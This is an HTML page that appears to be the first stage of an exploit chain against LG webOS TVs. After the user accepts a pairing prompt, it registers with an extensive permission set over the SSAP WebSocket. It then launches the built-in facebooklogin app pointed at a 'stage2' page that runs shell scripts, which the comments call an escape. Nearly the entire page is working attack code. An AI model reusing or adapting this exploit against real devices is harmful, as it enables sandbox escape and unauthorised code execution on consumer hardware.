<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Return the Beanbird Cursor</title>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .button { padding: 20px 40px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; transition: 0.2s; }
        #btn-run { background: #ff0066; border: 2px solid #ff9900; }
        #btn-reset { background: #444; color: #ccc; }
        .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; overflow-y: auto; }
        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 10px; display: inline-block; margin: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Return the Beanbird Cursor</h1>
    <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
    
    <button id="btn-run" class="button">Return Beanbird Cursor</button>
    <button id="btn-reset" class="button">Reset to Default</button>
    <br>
    <div class="note">Note: TV will be blackscreen for 10-20 seconds during the process.</div>
    
    <div id="log">Status: Ready.</div>

    <script>
        var logBox = document.querySelector('#log');
        function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }

        function startExploit(scriptName) {
            log("Connecting to SSAP...");
            var ws = new WebSocket('ws://127.0.0.1:3000');

            ws.onerror = function() { log("ERROR: WebSocket failed. Is the TV on the same network?"); };
            ws.onclose = function() { log("Connection closed."); };

            ws.onopen = function() {
                log("Connection open. >>> ACCEPT THE PROMPT ON YOUR TV <<<");
                ws.send(JSON.stringify({
                    id: "register_0",
                    type: "register",
                    payload: {
                        forcePairing: false,
                        pairingType: "PROMPT",
                        manifest: {
                            // Full permission set required by webOS 4.x for launcher access
                            manifestVersion: 1,
                            appVersion: "1.1",
                            permissions: [
                                "LAUNCH",
                                "LAUNCH_WEBAPP",
                                "APP_TO_APP",
                                "CLOSE",
                                "TEST_OPEN",
                                "TEST_PROTECTED",
                                "CONTROL_AUDIO",
                                "CONTROL_DISPLAY",
                                "CONTROL_INPUT_JOYSTICK",
                                "CONTROL_INPUT_MEDIA_RECORDING",
                                "CONTROL_INPUT_MEDIA_PLAYBACK",
                                "CONTROL_INPUT_TV",
                                "CONTROL_POWER",
                                "READ_NOTIFICATION_8",
                                "READ_TV_CHANNEL_LIST",
                                "WRITE_NOTIFICATION_ALERT",
                                "CONTROL_INPUT_TEXT",
                                "CONTROL_MOUSE_AND_KEYBOARD",
                                "READ_INSTALLED_APPS",
                                "READ_LGE_SDX",
                                "READ_LGE_TV_INPUT_HELP_APP",
                                "SYSTEM_CONTROL"
                            ]
                        }
                    }
                }));
            };

            ws.onmessage = function(e) {
                var res;
                try { res = JSON.parse(e.data); } catch(ex) { log("Parse error: " + e.data); return; }

                log("MSG type=" + res.type + (res.error ? " error=" + res.error : ""));

                if (res.type === "response" && res.error === "403 too many ACKs") {
                    // Already paired from a previous session — just proceed
                    log("Already paired (403 ACK). Proceeding...");
                    launchFacebook(ws, scriptName);
                    return;
                }

                if (res.type === "response") {
                    // webOS 4 sends a "response" with a client-key before "registered"
                    // Nothing to do — wait for the next message
                    log("Waiting for user to accept prompt...");
                    return;
                }

                if (res.type === "registered") {
                    log("Registered! Launching facebooklogin escape...");
                    launchFacebook(ws, scriptName);
                }
            };
        }

        function launchFacebook(ws, scriptName) {
            var stage2Url = window.location.origin + "/stage2.html?run=" + encodeURIComponent(scriptName);
            // facebooklogin loads a server URL directly — strip protocol, append # to stop it adding its own path
            var serverParam = stage2Url.replace(/^https?:\/\//, '') + "#";
            log("stage2 URL: " + stage2Url);
            ws.send(JSON.stringify({
                id: "launch_fb",
                type: "request",
                uri: "ssap://system.launcher/launch",
                payload: {
                    id: "com.webos.app.facebooklogin",
                    params: { server: serverParam }
                }
            }));
        }

        document.querySelector('#btn-run').onclick = function() { startExploit('beanbird.sh'); };
        document.querySelector('#btn-reset').onclick = function() { startExploit('reboot.sh'); };
    </script>
</body>
</html>
